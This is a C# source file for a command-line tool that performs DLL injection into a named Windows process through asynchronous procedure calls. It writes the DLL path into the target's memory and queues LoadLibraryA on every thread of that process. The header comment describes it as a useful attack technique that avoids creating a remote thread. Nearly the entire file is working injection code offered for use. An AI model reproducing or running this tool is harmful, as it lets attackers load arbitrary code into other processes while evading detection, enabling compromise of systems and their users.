using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

/*
 * Process Injection via Asynchronous Procedure Calls
 * Benefit of Remote Thread Process Injection because we're not creating a thread.
 * Perhaps inferior to other methods such as process hollowing, but a useful TTP.
 */

namespace APC_Injection
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        public const int
        PROCESS_VM_OPERATION = 0x0008,
        PROCESS_VM_WRITE = 0x0020,
        MEM_COMMIT = 0x00001000,
        MEM_RESERVE = 0x00002000,
        TH32CS_SNAPTHREAD = 0x00000004,
        PAGE_READWRITE = 0x0040;

        [Flags]
        private enum SnapshotFlags : uint
        {
            HeapList = 0x00000001,
            Process = 0x00000002,
            TH32CS_SNAPTHREAD = 0x00000004,
            Module = 0x00000008,
            Module32 = 0x00000010,
            Inherit = 0x80000000,
            All = 0x000001F,
            NoHeaps = 0x40000000
        }

        [Flags]
        private enum ThreadAccess : uint
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }

        public struct THREADENTRY32
        {
            internal UInt32 dwSize;
            internal UInt32 cntUsage;
            internal UInt32 th32ThreadID;
            internal UInt32 th32OwnerProcessID;
            internal UInt32 tpBasePri;
            internal UInt32 tpDeltaPri;
            internal UInt32 dwFlags;
        }

        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: ApcInject <processName> <dllpath>");
                return;
            }

            string targetProcessName = args[0];
            string dllPath = args[1];

            // Automatically find the PID by process name
            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName(targetProcessName.Replace(".exe", ""));

            if (processes.Length == 0)
            {
                Console.WriteLine($"Could not find process: {targetProcessName}");
                return;
            }

            uint pid = (uint)processes[0].Id;
            Console.WriteLine($"Found {targetProcessName} with PID: {pid}");


            IntPtr hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, pid);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("Failed to open process. Check permissions (Admin?).");
                return;
            }

            IntPtr memLoc = (IntPtr)null;
            IntPtr buffer = VirtualAllocEx(hProcess, memLoc, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            // Add +1 to the length to account for the null terminator
            byte[] pathBytes = System.Text.Encoding.UTF8.GetBytes(args[1] + "\0");

            int output;
            WriteProcessMemory(hProcess, buffer, pathBytes, (uint)pathBytes.Length, out output);

            // Get threads associated with our PID.

            List<uint> tids = new List<uint>();
            IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (hSnapshot == INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("Bad handle.");
                return;
            }

            THREADENTRY32 te = new THREADENTRY32();
            te.dwSize = (uint)Marshal.SizeOf(te);
            if (Thread32First(hSnapshot, ref te))
            {
                do
                {
                    if (te.th32OwnerProcessID == pid)
                    {
                        tids.Add(te.th32ThreadID);
                    }
                } while (Thread32Next(hSnapshot, ref te));
            }

            // Open thread and schedule via APC.
            if (tids.Count == 0)
            {
                Console.WriteLine("No injectable threads.");
                return;
            }
            foreach (uint tid in tids)
            {
                IntPtr hThread = OpenThread(ThreadAccess.SET_CONTEXT, false, tid);
                QueueUserAPC(GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA"), hThread, buffer);
                CloseHandle(hThread);
            }

            CloseHandle(hProcess);
            Console.WriteLine("APC Sent!");
            return;
        }
    }
}